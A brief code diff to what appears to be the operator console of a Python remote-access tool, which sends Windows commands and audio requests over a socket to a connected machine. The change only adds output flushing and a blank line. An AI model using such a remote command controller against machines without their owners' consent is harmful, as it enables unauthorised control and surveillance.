@@ -271,7 +271,7 @@ def connect_server(ip, seed_):
                                 print(), send(sock, 'exit')
                                 break
                             else:
-                                send(sock, wincmd), print(recv(sock))   
+                                send(sock, wincmd), print(recv(sock), flush=True)   
                     elif cmd.startswith('audio') and ('-p' not in cmd):
                         send(sock, cmd), print(recv(sock)), sock.sendall(b'0x75d4bbca044e8c63')
                         
@@ -465,6 +465,7 @@ def main():
 
             clear()
             break
+
 
 
 if __name__ == '__main__': main()
